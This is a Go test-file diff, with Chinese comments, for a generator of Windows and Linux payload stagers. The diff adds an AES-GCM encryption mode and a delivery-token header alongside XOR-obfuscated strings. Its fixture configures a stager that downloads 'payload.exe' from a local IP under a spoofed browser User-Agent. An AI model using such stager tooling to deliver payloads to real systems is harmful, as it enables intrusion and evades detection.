@@ -4,11 +4,12 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 	"testing"
 )
 
 // TestGenerateSourceCodeCompiles 验证 Windows/Linux 模板生成源码可编译
-//（覆盖 URL/UA 字节数组拼接 + XorKey 解密函数注入的模板正确性）
+// （覆盖 URL/UA 字节数组拼接 + XorKey 解密函数注入的模板正确性）
 func TestGenerateSourceCodeCompiles(t *testing.T) {
 	// 检查 go 工具链
 	if _, err := exec.LookPath("go"); err != nil {
@@ -18,13 +19,16 @@ func TestGenerateSourceCodeCompiles(t *testing.T) {
 	cases := []struct {
 		name string
 		os   string
+		aead bool
 	}{
-		{"windows", "windows"},
-		{"linux", "linux"},
+		{"windows", "windows", false},
+		{"linux", "linux", false},
+		{"windows-aead", "windows", true},
+		{"linux-aead", "linux", true},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
-			sb := NewStagerBuilder(&StagerConfig{
+			cfg := &StagerConfig{
 				DownloadURL: "http://192.168.0.102:8089/d/ab12cd/full/payload.exe",
 				UserAgent:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
 				Timeout:     30,
@@ -34,13 +38,33 @@ func TestGenerateSourceCodeCompiles(t *testing.T) {
 				MaxRetries:  3,
 				Password:    "secret",
 				XorKey:      0x5A,
-			})
+				AccessToken: "deliver-token-123",
+			}
+			if c.aead {
+				cfg.XorKey = 0
+				cfg.CryptoMode = "aead"
+				cfg.DeliveryKey = []byte("0123456789abcdef0123456789abcdef")
+			}
+			sb := NewStagerBuilder(cfg)
 			if err := sb.GenerateSourceCode(); err != nil {
 				t.Fatalf("GenerateSourceCode: %v", err)
 			}
 			src := sb.GetSourceCode()
 			if len(src) == 0 {
 				t.Fatal("生成的源码为空")
+			}
+			if !strings.Contains(src, "X-Delivery-Token") || !strings.Contains(src, "deliver-token-123") {
+				t.Fatal("配置 AccessToken 后源码应通过 X-Delivery-Token 头携带令牌")
+			}
+			if c.aead {
+				if !strings.Contains(src, "crypto/aes") || !strings.Contains(src, "crypto/cipher") {
+					t.Fatal("AEAD 模式下源码应导入 crypto/aes 与 crypto/cipher")
+				}
+				if strings.Contains(src, "^=") {
+					t.Fatal("AEAD 模式不应再生成 XOR 解密")
+				}
+			} else if strings.Contains(src, "crypto/aes") {
+				t.Fatal("非 AEAD 模式不应导入 crypto/aes")
 			}
 
 			// 编译验证
